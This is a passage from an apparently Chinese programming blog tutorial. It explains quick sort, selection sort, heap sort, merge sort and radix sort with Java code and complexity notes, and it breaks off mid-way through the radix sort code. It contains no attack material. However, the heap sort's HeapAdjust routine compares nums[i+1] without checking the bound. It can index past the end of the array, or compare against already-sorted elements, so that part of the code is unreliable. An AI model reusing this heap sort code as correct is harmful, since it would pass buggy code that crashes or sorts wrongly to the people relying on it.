class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(n^2)</p><p><strong>空间复杂度</strong>：O(1)</p><h3 id="2-2-快速排序"><a href="#2-2-快速排序" class="headerlink" title="2.2 快速排序"></a>2.2 快速排序</h3><p>快速排序的核心操作是“哨兵划分”，其目标是：选择数组中的某个元素作为“基准数”，将所有小于基准数的元素移到其左侧，而大于基准数的元素移到其右侧。然后在对基准数左边和右边的表进行上述过程，直到每个表只有一个记录。</p><p><strong>一趟快速排序的基本步骤如下：</strong></p><ol><li>选择待排序表中的第一个元素作为基准数，附设两个指针<strong>low</strong>和<strong>high</strong>，初始时分别指向表的下界和上界(即low=0，high=nums.length-1);</li><li>从表的最右侧位置依次向左搜索，找到第一个关键字小于基准数的位置 ，将它移到low处。</li><li>然后从表的最左侧位置依次向右搜索，找到第一个关键字大于基准数的位置 ，将它移到high处。</li><li>重复第二步和第三步，直到low和high相等，这时把基准数移到low处，就将表分为了左右子表</li></ol><p><img src="/../image/image-20240319203555476.png" alt="一次快速排序的过程"></p><p><strong>算法流程</strong>：</p><ol><li>首先，对原数组执行一次“哨兵划分”，得到未排序的左子数组和右子数组。</li><li>然后，对左子数组和右子数组分别递归执行“哨兵划分”。</li><li>持续递归，直至子数组长度为 1 时终止，从而完成整个数组的排序。</li></ol><p><img src="/../image/quick_sort_overview.png" alt="快速排序流程"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">//对nums[low,high]进行一次排序，返回基准点的位置</span><span class="token keyword">int</span> <span class="token class-name">Partition</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span> low<span class="token punctuation">,</span><span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> base <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token comment">//比基准点大的跳过</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span> <span class="token operator">&gt;=</span> base<span class="token punctuation">)</span><span class="token punctuation">{</span>            high<span class="token operator">--</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//把比基准点小的移到低端</span>        <span class="token comment">//比基准点小的跳过</span>        <span class="token keyword">while</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high <span class="token operator">&amp;&amp;</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> base<span class="token punctuation">)</span><span class="token punctuation">{</span>            low<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        nums<span class="token punctuation">[</span>high<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span><span class="token punctuation">;</span>         <span class="token comment">//把比基准点大的移到高端</span>    <span class="token punctuation">}</span>    nums<span class="token punctuation">[</span>low<span class="token punctuation">]</span> <span class="token operator">=</span> base<span class="token punctuation">;</span>    <span class="token keyword">return</span> low<span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token class-name">QSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span> low<span class="token punctuation">,</span><span class="token keyword">int</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">if</span><span class="token punctuation">(</span>low <span class="token operator">&lt;</span> high<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token class-name">Partition</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>low<span class="token punctuation">,</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">QSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>low<span class="token punctuation">,</span>mid<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token class-name">QSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>mid<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">,</span>high<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">void</span> <span class="token class-name">QuickSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">QSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>nums<span class="token punctuation">.</span>length<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(nlog2n)</p><p><strong>空间复杂度</strong>：最好情况为O(log2n)，最坏为O(n)</p><h2 id="3-选择类"><a href="#3-选择类" class="headerlink" title="3. 选择类"></a>3. 选择类</h2><h3 id="3-1-简单选择排序"><a href="#3-1-简单选择排序" class="headerlink" title="3.1 简单选择排序"></a>3.1 简单选择排序</h3><p>「选择排序 selection sort」的工作原理非常简单：开启一个循环，每轮从未排序区间选择最小的元素，将其放到已排序区间的末尾。</p><p>设数组的长度为 n ，选择排序的<strong>算法流程</strong>：</p><ol><li>初始状态下，所有元素未排序，即未排序（索引）区间为 [0,n−1] 。</li><li>选取区间 [0,n−1] 中的最小元素，将其与索引 0 处的元素交换。完成后，数组前 1 个元素已排序。</li><li>选取区间 [1,n−1] 中的最小元素，将其与索引 1 处的元素交换。完成后，数组前 2 个元素已排序。</li><li>以此类推。经过 n−1 轮选择与交换后，数组前 n−1 个元素已排序。</li><li>仅剩的一个元素必定是最大元素，无须排序，因此数组排序完成。</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">SelectSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>i<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> i<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> k<span class="token operator">=</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>k<span class="token operator">&lt;</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>k<span class="token operator">++</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>k<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>                j <span class="token operator">=</span> k<span class="token punctuation">;</span>            <span class="token punctuation">}</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>j <span class="token operator">!=</span> i<span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">int</span> t <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>            nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>            nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> t<span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(n^2)</p><p><strong>空间复杂度</strong>：O(1)</p><h3 id="3-2-堆排序"><a href="#3-2-堆排序" class="headerlink" title="3.2 堆排序"></a>3.2 堆排序</h3><p>堆排序是一种树形选择排序，在排序过程中，将待排序的记录r[1..n]看成一棵完全二叉树的颗序存储结构，利用完全二叉树中双亲节点和孩子节点之间的内在关系，在当前无序的序列中选择关键字最大(或最小)的记录。</p><p><strong>堆</strong>是由n个满足以下条件的元素序列{k1,k2,…,kn}组成的<br>$$<br>(1)k_i&gt;=k_{2i}且k_i&gt;=k_{2i+1}或(2)k_i&lt;=k_{2i}且k_i&lt;=k_{2i+1}<br>$$<br>若将和此序列对应的一维数组(即以一维数组做此序列的存储结构)看成是一个完全二叉树，则堆实质上是满足如下性质的完全二叉树:树中所有非终端节点的值均不大于(或不小于)其左、右孩子节点的值。</p><p>堆顶元素为最大值的为大根堆，堆顶元素为最小值的为小根堆</p><p>设数组的长度为 n ，堆排序的流程如下。</p><ol><li>输入数组并建立大顶堆。完成后，最大元素位于堆顶。</li><li>将堆顶元素（第一个元素）与堆底元素（最后一个元素）交换。完成交换后，堆的长度减 1 ，已排序元素数量加 1 。</li><li>从堆顶元素开始，从顶到底执行堆化操作（sift down）。完成堆化后，堆的性质得到修复。</li><li>循环执行第 <code>2.</code> 步和第 <code>3.</code> 步。循环 n−1 轮后，即可完成数组排序。</li></ol><p>实现堆排序需要解决两个问题：</p><ol><li>建初堆：如何将一个无序序列建成一个堆</li><li>调整堆：在堆顶元素改变后，如何调整剩余元素成为一个新的堆</li></ol><h5 id="调整堆"><a href="#调整堆" class="headerlink" title="调整堆"></a><strong>调整堆</strong></h5><p>假设r[s+1,m]已经是堆，按筛选法将r[s,m]调整为以r[s]为根的堆，算法如下：</p><ol><li>从r[2s+1]和r[2s+2]中选出关键字较大者，假设r[2s+1]较大，比较r[s]和r[2s+1]的关键字、</li><li>若r[s]&gt;=r[2s+1],说明以r[s]为根的子树已经是堆，不必进行任何调整。</li><li>若r[s]&lt;r[2s+1],交换r[s]和r[2s+1],交换后，以r[2s+2]为根的子树仍是堆，如果以r[2s+1]为根的子树不是堆，则重复上述过程，直到进行到叶子结点位置</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">HeapAdjust</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span> s<span class="token punctuation">,</span><span class="token keyword">int</span> m<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token keyword">int</span> rs <span class="token operator">=</span> nums<span class="token punctuation">[</span>s<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>s<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&lt;</span>m<span class="token punctuation">;</span>i<span class="token operator">=</span><span class="token number">2</span><span class="token operator">*</span>i<span class="token operator">+</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;</span> nums<span class="token punctuation">[</span>i <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            i<span class="token operator">++</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        <span class="token keyword">if</span><span class="token punctuation">(</span>rs <span class="token operator">&gt;=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token keyword">break</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>        nums<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        s <span class="token operator">=</span> i<span class="token punctuation">;</span>    <span class="token punctuation">}</span>    nums<span class="token punctuation">[</span>s<span class="token punctuation">]</span> <span class="token operator">=</span> rs<span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="建新堆"><a href="#建新堆" class="headerlink" title="建新堆"></a>建新堆</h5><p>要将一个无序序列调整为堆，就必须将其对应的完全二叉树中以每一个节点为根的子树都调整为堆。显然，只有一个节点的树必然是堆，而在完全二叉树中所有序号大于等于n/2的节点都是叶子，因此这些节点为根的子树均为堆。这样只要从倒数第一个不是叶子的节点开始向前调整堆即可</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">CreatHeap</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token keyword">int</span> n<span class="token operator">=</span>nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>        <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>n<span class="token operator">/</span><span class="token number">2</span><span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&gt;=</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span><span class="token punctuation">{</span>            <span class="token class-name">HeapAdjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span>i<span class="token punctuation">,</span>n<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">}</span>    <span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h5 id="堆排序"><a href="#堆排序" class="headerlink" title="堆排序"></a>堆排序</h5><p>先建立新堆，然后反复进行交换和堆调整</p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">HeapSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token class-name">CreatHeap</span><span class="token punctuation">(</span>nums<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> len <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token keyword">for</span><span class="token punctuation">(</span><span class="token keyword">int</span> i<span class="token operator">=</span>len<span class="token operator">-</span><span class="token number">1</span><span class="token punctuation">;</span>i<span class="token operator">&gt;</span><span class="token number">0</span><span class="token punctuation">;</span>i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> x <span class="token operator">=</span> nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        nums<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>        nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> x<span class="token punctuation">;</span>        <span class="token class-name">HeapAdjust</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span><span class="token number">0</span><span class="token punctuation">,</span>i<span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(nlog2n)</p><p><strong>空间复杂度</strong>：O(1)</p><h2 id="4-归并类"><a href="#4-归并类" class="headerlink" title="4. 归并类"></a>4. 归并类</h2><h3 id="4-1-归并排序"><a href="#4-1-归并排序" class="headerlink" title="4.1 归并排序"></a>4.1 归并排序</h3><p><strong>归并排序</strong>就是将两个或两个以上的有序表合并成一个有序表的过程。将两个有序表合并成一个有序表的过程称为<strong>2-路归并</strong>，这里记录最简单的2-路归并。</p><p>归并排序算法的思想是：假设初始序列含有n个记录，则可以将其看成n个有序的子序列，每个子序列的长度为1，然后两两归并，直到得到一个长度为n的有序序列为止。</p><p><img src="/../image/merge_sort_overview.png" alt="归并排序的划分与合并阶段"></p><h4 id="相邻两个有序子序列的归并"><a href="#相邻两个有序子序列的归并" class="headerlink" title="相邻两个有序子序列的归并"></a>相邻两个有序子序列的归并</h4><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token keyword">void</span> <span class="token class-name">Merge</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span><span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> mid<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span><span class="token punctuation">{</span>    <span class="token comment">// 左子数组区间为 [left, mid], 右子数组区间为 [mid+1, right]</span>    <span class="token comment">// 创建一个临时数组 tmp ，用于存放合并后的结果</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> tmp <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>right <span class="token operator">-</span> left <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token comment">// 初始化左子数组和右子数组的起始索引</span>    <span class="token keyword">int</span> i <span class="token operator">=</span> left<span class="token punctuation">,</span> j <span class="token operator">=</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span>    <span class="token comment">// 当左右子数组都还有元素时，进行比较并将较小的元素复制到临时数组中</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid <span class="token operator">&amp;&amp;</span> j <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">&lt;=</span> nums<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">)</span>            tmp<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>        <span class="token keyword">else</span>            tmp<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 将左子数组和右子数组的剩余元素复制到临时数组中</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>i <span class="token operator">&lt;=</span> mid<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tmp<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token keyword">while</span> <span class="token punctuation">(</span>j <span class="token operator">&lt;=</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>        tmp<span class="token punctuation">[</span>k<span class="token operator">++</span><span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>j<span class="token operator">++</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 将临时数组 tmp 中的元素复制回原数组 nums 的对应区间</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span>k <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> k <span class="token operator">&lt;</span> tmp<span class="token punctuation">.</span>length<span class="token punctuation">;</span> k<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        nums<span class="token punctuation">[</span>left <span class="token operator">+</span> k<span class="token punctuation">]</span> <span class="token operator">=</span> tmp<span class="token punctuation">[</span>k<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="归并排序"><a href="#归并排序" class="headerlink" title="归并排序"></a>归并排序</h4><ol><li>计算数组中点 <code>mid</code> ，递归划分左子数组（区间 <code>[left, mid]</code> ）和右子数组（区间 <code>[mid + 1, right]</code> ）。</li><li>递归执行步骤 <code>1.</code> ，直至子数组区间长度为 1 时终止。</li></ol><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* 归并排序 */</span><span class="token keyword">void</span> <span class="token function">mergeSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> left<span class="token punctuation">,</span> <span class="token keyword">int</span> right<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 终止条件</span>    <span class="token keyword">if</span> <span class="token punctuation">(</span>left <span class="token operator">&gt;=</span> right<span class="token punctuation">)</span>        <span class="token keyword">return</span><span class="token punctuation">;</span> <span class="token comment">// 当子数组长度为 1 时终止递归</span>    <span class="token comment">// 划分阶段</span>    <span class="token keyword">int</span> mid <span class="token operator">=</span> <span class="token punctuation">(</span>left <span class="token operator">+</span> right<span class="token punctuation">)</span> <span class="token operator">/</span> <span class="token number">2</span><span class="token punctuation">;</span> <span class="token comment">// 计算中点</span>    <span class="token function">mergeSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归左子数组</span>    <span class="token function">mergeSort</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> mid <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 递归右子数组</span>    <span class="token comment">// 合并阶段</span>    <span class="token class-name">Merge</span><span class="token punctuation">(</span>nums<span class="token punctuation">,</span> left<span class="token punctuation">,</span> mid<span class="token punctuation">,</span> right<span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><strong>时间复杂度</strong>：O(nlog2n)</p><p><strong>空间复杂度</strong>：O(n)</p><h2 id="5-分配类"><a href="#5-分配类" class="headerlink" title="5. 分配类"></a>5. 分配类</h2><h3 id="5-1-基数排序"><a href="#5-1-基数排序" class="headerlink" title="5.1 基数排序"></a>5.1 基数排序</h3><p><strong>算法流程</strong></p><ol><li>初始化位数 n=1 。</li><li>对学号的第 n 位执行“计数排序”。完成后，数据会根据第 n 位从小到大排序。</li><li>将 n 增加 1 ，然后返回步骤 <code>2.</code> 继续迭代，直到所有位都排序完成后结束。</li></ol><p><img src="/../image/radix_sort_overview.png" alt="基数排序算法流程"></p><pre class="line-numbers language-java" data-language="java"><code class="language-java"><span class="token comment">/* 获取元素 num 的第 k 位，其中 exp = 10^(k-1) */</span><span class="token keyword">int</span> <span class="token function">digit</span><span class="token punctuation">(</span><span class="token keyword">int</span> num<span class="token punctuation">,</span> <span class="token keyword">int</span> exp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 传入 exp 而非 k 可以避免在此重复执行昂贵的次方计算</span>    <span class="token keyword">return</span> <span class="token punctuation">(</span>num <span class="token operator">/</span> exp<span class="token punctuation">)</span> <span class="token operator">%</span> <span class="token number">10</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 计数排序（根据 nums 第 k 位排序） */</span><span class="token keyword">void</span> <span class="token function">countingSortDigit</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token punctuation">,</span> <span class="token keyword">int</span> exp<span class="token punctuation">)</span> <span class="token punctuation">{</span>    <span class="token comment">// 十进制的位范围为 0~9 ，因此需要长度为 10 的桶数组</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> counter <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">int</span> n <span class="token operator">=</span> nums<span class="token punctuation">.</span>length<span class="token punctuation">;</span>    <span class="token comment">// 统计 0~9 各数字的出现次数</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> d <span class="token operator">=</span> <span class="token function">digit</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> exp<span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// 获取 nums[i] 第 k 位，记为 d</span>        counter<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">++</span><span class="token punctuation">;</span>                <span class="token comment">// 统计数字 d 的出现次数</span>    <span class="token punctuation">}</span>    <span class="token comment">// 求前缀和，将“出现个数”转换为“数组索引”</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> <span class="token number">10</span><span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        counter<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">+=</span> counter<span class="token punctuation">[</span>i <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span>    <span class="token comment">// 倒序遍历，根据桶内统计结果，将各元素填入 res</span>    <span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> res <span class="token operator">=</span> <span class="token keyword">new</span> <span class="token keyword">int</span><span class="token punctuation">[</span>n<span class="token punctuation">]</span><span class="token punctuation">;</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> n <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> i <span class="token operator">&gt;=</span> <span class="token number">0</span><span class="token punctuation">;</span> i<span class="token operator">--</span><span class="token punctuation">)</span> <span class="token punctuation">{</span>        <span class="token keyword">int</span> d <span class="token operator">=</span> <span class="token function">digit</span><span class="token punctuation">(</span>nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">,</span> exp<span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token keyword">int</span> j <span class="token operator">=</span> counter<span class="token punctuation">[</span>d<span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">;</span> <span class="token comment">// 获取 d 在数组中的索引 j</span>        res<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span>       <span class="token comment">// 将当前元素填入索引 j</span>        counter<span class="token punctuation">[</span>d<span class="token punctuation">]</span><span class="token operator">--</span><span class="token punctuation">;</span>           <span class="token comment">// 将 d 的数量减 1</span>    <span class="token punctuation">}</span>    <span class="token comment">// 使用结果覆盖原数组 nums</span>    <span class="token keyword">for</span> <span class="token punctuation">(</span><span class="token keyword">int</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;</span> n<span class="token punctuation">;</span> i<span class="token operator">++</span><span class="token punctuation">)</span>        nums<span class="token punctuation">[</span>i<span class="token punctuation">]</span> <span class="token operator">=</span> res<span class="token punctuation">[</span>i<span class="token punctuation">]</span><span class="token punctuation">;</span><span class="token punctuation">}</span><span class="token comment">/* 基数排序 */</span><span class="token keyword">void</span> <span class="token function">radixSort</span><span class="token punctuation">(</span><span class="token keyword">int</span><span class="token punctuation">[</span><span class="token punctuation">]</span> nums<span class="token 